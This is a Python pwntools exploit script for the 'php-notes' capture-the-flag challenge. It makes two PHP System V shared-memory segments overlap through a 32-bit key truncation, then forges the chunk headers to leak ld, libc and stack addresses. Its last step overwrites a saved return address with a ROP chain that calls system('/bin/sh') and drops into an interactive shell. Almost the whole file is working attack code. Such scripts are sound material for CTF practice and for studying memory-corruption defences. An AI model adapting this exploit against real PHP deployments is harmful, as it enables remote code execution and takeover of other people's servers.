from pwn import *

libc = ELF("./libc.so.6")
context.arch = "amd64"


class ShmChunk:
    def __init__(self, key, length, next, content):
        self.key = key
        self.length = length
        self.next = next
        self.content = content

    def get(self):
        return flat(p64(self.key), p64(self.length), p64(self.next), self.content)

    def get_mem(self, data):
        return data[: self.length]

    def __repr__(self) -> str:
        return f"""struct sysvshm_chunk {{
\tzend_long key = {self.key};
\tzend_long length = {self.length};
\tzend_long next = {self.next};
\tzend_long mem = {chr(self.content[0])};
}};

Content: {self.content}
"""


class ShmObject:
    def __init__(self, magic, start, end, free, total, data):
        self.magic = magic
        self.start = start
        self.end = end
        self.free = free
        self.total = total
        self.data = data

    def get(self):
        return flat(
            self.magic, p64(self.start), p64(self.end), p64(self.free), p64(self.total)
        )

    def __repr__(self) -> str:
        return f"""struct sysvshm_chunk_head {{
\tchar magic[8] = {self.magic};
\tzend_long start = {self.start};
\tzend_long end = {self.end};
\tzend_long free = {self.free};
\tzend_long total = {self.total};
}};"""

    def search_key(self, key):
        # Search for the key
        # Not very inherent for the challenge

        pos = self.start

        while True:
            if pos >= self.end:
                return None

            chunk_key = u64(self.data[pos : pos + 8])
            length = u64(self.data[pos + 8 : pos + 16])
            next = u64(self.data[pos + 16 : pos + 24])
            mem = self.data[pos + 24]

            chunk = ShmChunk(
                chunk_key, length, next, self.data[pos + 24 : pos + 24 + length]
            )

            if chunk.key == key:
                return chunk

            pos += chunk.next

            if chunk.next == 0 or pos < self.start:
                return None


def run():
    global LD_OFFSET

    if args.LOCAL:
        r = remote("leone", 1338)
        LD_OFFSET = 31
    else:
        r = remote("php-notes.chal.crewc.tf", 1337)
        LD_OFFSET = 91

    return r


def create_notepad(r):
    # we can create this only one time
    # so hardocding the values

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"id: ", b"4294967295")
    r.sendlineafter(b"Size:", b"3600")


def create_note(r, id, content):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"id: ", id)
    r.sendlineafter(b"contents:", content)


def create_memo(r, id=b"8589934591", size=b"256"):
    # overlap with the notepad
    # so hardcding the values

    r.sendlineafter(b"> ", b"6")
    r.sendlineafter(b"id: ", id)
    r.sendlineafter(b"Size: ", size)


def edit_memo(r, content):
    r.sendlineafter(b"> ", b"7")
    r.sendlineafter(b"contents: ", content)


def view_memo(r):
    r.sendlineafter(b"> ", b"8")


def view_note(r, id):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b": ", id)


r = run()

# overlap this memo with the notepad
# because key_t is int while int in php are 64 bit
# so 2**32-1 and (2**32 + (2**32-1)) are the same

create_memo(r)

create_notepad(r)

create_note(r, b"13", b"A" * 50)

# memo and notepad are overlapping, so we can get the view of the
# serialized notepad by viewing the memo

view_memo(r)

data = r.recvuntil(b"1.", drop=True)

shm_object = ShmObject(
    data[:8],
    u64(data[8:16]),
    u64(data[16:24]),
    u64(data[24:32]),
    u64(data[32:40]),
    data,
)

log.info(shm_object)

shm_chunk = shm_object.search_key(13)

log.info(shm_chunk)

# The virtual mapping is stable so we have for each execution
###########################
# SHARED_MEMORY (notepad)
# anon_segment
# ld segments
# SHARED_MEMORY (memo, but in reality is a remapping of notepad so it have the same content)
# remaining ld segments
###########################

# The distance is fixed
# Distance is where the chunk starts
distance = 254752

# We can fake the size of the string to get partial arbitrary read
# But we need to land in address that starts with '";'
# ld segments are at fixed distance from the shared memory so we can use arbitrary write to fix this

shm_object.end = distance

# After 's:' we specify the length of the string, how many bytes read before meet '";'
shm_chunk.content = shm_chunk.content.replace(b"s:50", f"s:{distance - 30}".encode())
shm_chunk.length = 0xDEADBEEF

payload = shm_object.get() + shm_chunk.get()
log.info(f"Fake objects:\n{shm_object}\n{shm_chunk}")

edit_memo(r, payload)

stop_str = b"v0lp3_was_here"
create_note(r, b"1", stop_str)
view_note(r, b"13")
leak = r.recvuntil(stop_str)

segment_after_shm = [u64(leak[i : i + 8]) for i in range(4022, 6022, 8)]

# # After we get ld all others address can be calculated by the distance
ld_leak = segment_after_shm[LD_OFFSET] - 0x2DD6D
libc.address = ld_leak - 11489280
shm_addr = ld_leak - 12288

# environ leak
stack_leak = u64(leak[254598 : 254598 + 8])

log.info(f"ld @ 0x{ld_leak:x}")
log.info(f"libc @ 0x{libc.address:x}")
log.info(f"shmaddress @ 0x{shm_addr:x}")

ret_addr_target = stack_leak - 14680
shm_object.end = (ret_addr_target - 32) - shm_addr

log.info(f"environ @ 0x{stack_leak:x}")
log.info(f"zend_execute saved rip @ 0x{ret_addr_target:x}")

payload = shm_object.get() + shm_chunk.get()
edit_memo(r, payload)

rop = ROP(libc)
binsh = next(libc.search(b"/bin/sh"))
ret = rop.find_gadget(["ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

chain = flat(
    p64(pop_rdi),
    p64(binsh),
    p64(ret),
    p64(libc.sym.system),
)

create_note(r, b"0", b"AA" + chain + cyclic(0x50 - len(chain) - 2))

# Trigger
r.sendlineafter(b">", b"")

log.success("Got shell?!")

r.interactive()
